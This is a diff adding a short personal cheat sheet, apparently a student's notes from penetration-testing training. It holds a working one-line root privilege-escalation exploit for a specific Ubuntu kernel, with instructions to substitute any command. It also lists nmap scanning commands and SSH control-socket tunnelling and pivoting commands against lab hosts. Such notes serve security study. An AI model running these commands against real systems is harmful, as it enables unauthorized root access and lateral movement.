@@ -1,0 +1,20 @@
+##### JOHNSONS NOTES #####
+
+## IMPORTANT COMMANDS ##
+PRIV ESCALATE FOR KERNEL VER 4.15.0-88-generic #88-Ubuntu (JUST CHANGE THE "WHOAMI" TO WHATEVER COMMAND YOU WANT TO RUN)
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("whoami")'
+
+## NMAP ##
+command - nmap -Pn -T4 -sT --min-rate 999999 192.168.1.1 -p 80,22,443,20,21 --scripts http-enum.nse
+(scripts)
+http-enum.nse
+smb-os-dsciovery.nse
+http-robots.txt.nse
+
+## CONTROL SOCKETS AND TUNNELS ##
+ssh -MS /tmp/gray student@10.50.21.186
+ssh -S /tmp/gray gray
+ssh -O forward -S /tmp/gray -D 9050 placeholder
+ssh -O cancel -S /tmp/gray -D 9050 placeholder
+ssh -O forward -S /tmp/gray -L 50801:192.168.28.111:80 dummy
+ssh -i id_rsa www-data@10.50.26.109
